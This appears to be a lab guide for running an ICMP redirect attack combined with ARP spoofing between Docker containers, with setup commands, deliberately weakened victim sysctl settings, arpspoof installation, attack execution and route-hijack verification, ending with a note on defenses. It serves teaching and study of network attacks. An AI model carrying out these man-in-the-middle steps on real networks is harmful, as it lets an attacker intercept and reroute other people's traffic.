# ICMP Redirect Attack with ARP Spoofing - Execution Guide

## Overview
This guide documents the complete process to successfully execute the ICMP redirect attack with ARP spoofing in a macvlan environment.

## Prerequisites Setup

### 1. Environment Setup
```bash
cd ICMP-Redirect/scripts
sudo ./setup.sh
```

### 2. Victim Configuration (Critical for Success)
The victim container needs specific sysctl settings for ICMP redirects to work:

```bash
# Enable ICMP redirect acceptance
docker exec victim sysctl -w net.ipv4.conf.all.accept_redirects=1
docker exec victim sysctl -w net.ipv4.conf.eth1.accept_redirects=1

# Disable secure redirects (allows redirects from any source)
docker exec victim sysctl -w net.ipv4.conf.all.secure_redirects=0
docker exec victim sysctl -w net.ipv4.conf.eth1.secure_redirects=0

# Enable shared media (allows redirects on same subnet)
docker exec victim sysctl -w net.ipv4.conf.all.shared_media=1
docker exec victim sysctl -w net.ipv4.conf.eth1.shared_media=1
```

### 3. Fix Attacker Container (if dsniff not installed)
If the attacker container doesn't have ARP spoofing tools:

```bash
# Connect attacker to bridge network for internet access
docker network connect bridge attacker

# Install dsniff package (contains arpspoof)
docker exec attacker apt update
docker exec attacker apt install -y dsniff

# Disconnect from bridge (optional, attacker will use macvlan)
docker network disconnect bridge attacker
```

## Attack Execution

### 1. Start the Attack
```bash
docker exec -it attacker python3 /root/icmp_redirect_attack.py
```

Expected output:
```
🚀 ICMP Redirect Attack with ARP Spoofing
==========================================
🎯 Target: 10.9.0.5 (victim)
👹 Attacker: 10.9.0.105 (us)
🌐 Router: 10.9.0.11 (spoofed source)
🎯 Targets: 10.9.0.200, 10.9.0.201
📡 Interface: eth1
==========================================
✅ arpspoof is available
✅ Enabled IP forwarding on attacker
🎭 Starting ARP spoofing...
   Spoofing as router (10.9.0.11) to victim (10.9.0.5)
   Spoofing as victim (10.9.0.5) to router (10.9.0.11)
✅ ARP spoofing started successfully
📡 Starting packet capture on eth1...
🔍 Monitoring for victim traffic: 10.9.0.5 → targets
```

### 2. Generate Victim Traffic
In another terminal, generate traffic from victim:

```bash
# Generate external traffic (triggers redirects)
docker exec victim ping -c 2 8.8.8.8
```

### 3. Monitor Attack Progress
Watch the attacker output for:
```
🌐 External traffic detected: 10.9.0.5 → 8.8.8.8
📤 ICMP redirect #1 sent to 10.9.0.5
   Redirecting traffic to 10.9.0.105 (spoofed from 10.9.0.11)
```

## Verification and Testing

### 1. Verify ICMP Redirects are Received
Check if victim receives the ICMP redirect packets:

```bash
# Monitor ICMP traffic on victim (run in background)
docker exec victim tcpdump -i eth1 -n icmp and host 10.9.0.11 -c 5
```

Expected output:
```
IP 10.9.0.11 > 10.9.0.5: ICMP redirect 8.8.8.8 to host 10.9.0.105, length 36
```

### 2. Check Route Changes
Verify the attack success by checking victim's routing:

```bash
# Check specific route for target
docker exec victim ip route get 8.8.8.8
```

**Success indicators:**
```
8.8.8.8 via 10.9.0.105 dev eth1 src 10.9.0.5 uid 0 
    cache <redirected> expires 296sec
```

Key elements:
- ✅ `via 10.9.0.105` - Traffic routes through attacker
- ✅ `<redirected>` - Route created by ICMP redirect
- ✅ `expires` - Temporary redirect route

### 3. Test with Multiple Targets
```bash
# Test different external targets
docker exec victim ping -c 1 1.1.1.1
docker exec victim ip route get 1.1.1.1

docker exec victim ping -c 1 8.8.4.4
docker exec victim ip route get 8.8.4.4
```

## Resetting for Repeated Tests

### 1. Reset Route Cache
To test the attack multiple times:

```bash
# Flush route cache to reset redirected routes
docker exec victim ip route flush cache

# Verify routes are reset
docker exec victim ip route get 8.8.8.8
```

Should show original route:
```
8.8.8.8 via 10.9.0.11 dev eth1 src 10.9.0.5 uid 0 
    cache
```

### 2. Restart Attack
```bash
# Stop current attack (Ctrl+C)
# Restart attack script
docker exec -it attacker python3 /root/icmp_redirect_attack.py
```

## Troubleshooting

### Problem: ICMP redirects sent but routes don't change
**Solution:** Ensure victim sysctl settings are configured correctly:
```bash
docker exec victim sysctl net.ipv4.conf.all.accept_redirects
docker exec victim sysctl net.ipv4.conf.all.secure_redirects
docker exec victim sysctl net.ipv4.conf.all.shared_media
```

### Problem: arpspoof not found
**Solution:** Install dsniff package:
```bash
docker network connect bridge attacker
docker exec attacker apt update && apt install -y dsniff
```

### Problem: Attack script can't create packet socket
**Solution:** Ensure containers have proper capabilities:
```bash
# Check if containers are running with --privileged and --cap-add ALL
docker inspect attacker | grep -i privilege
```

### Problem: No traffic detected
**Solution:** Verify network setup:
```bash
# Check if containers are on macvlan network
docker exec attacker ip addr show eth1
docker exec victim ip addr show eth1

# Test basic connectivity
docker exec victim ping -c 1 10.9.0.105
```

## Success Metrics

### ✅ Complete Success
- ARP spoofing active (attacker is MITM)
- ICMP redirects sent and received
- Victim routing table shows `<redirected>` routes via attacker
- Traffic flows through attacker (10.9.0.105)

### ⚠️ Partial Success
- ARP spoofing works but redirects ignored
- ICMP redirects sent but no route changes
- May require additional sysctl configuration

### ❌ Failure
- arpspoof not available
- Packet capture fails
- No traffic detected between victim and targets

## Network Topology Recap

```
Macvlan Network: 10.9.0.0/24
├── victim (10.9.0.5)          # Target of attack
├── attacker (10.9.0.105)      # Performs ARP spoofing + ICMP redirects
├── router (10.9.0.11)         # Legitimate gateway (spoofed)
├── target (10.9.0.200)        # Internal target server
└── target2 (10.9.0.201)       # Secondary target server

Attack Flow:
1. ARP Spoofing: victim ↔ attacker ↔ router (MITM established)
2. Traffic Capture: Attacker sees all victim traffic
3. ICMP Redirects: Attacker sends forged redirects to victim
4. Route Manipulation: Victim routes traffic via attacker
```

## Security Implications

This attack demonstrates:
- **ARP Spoofing**: Layer 2 man-in-the-middle positioning
- **ICMP Redirect**: Layer 3 routing table manipulation
- **Traffic Interception**: Complete control over victim's network traffic
- **Modern Defenses**: Why secure_redirects and other protections exist

The attack succeeds when proper network security controls are disabled, showing the importance of:
- Secure ICMP redirect settings
- ARP spoofing detection
- Network segmentation
- Traffic monitoring
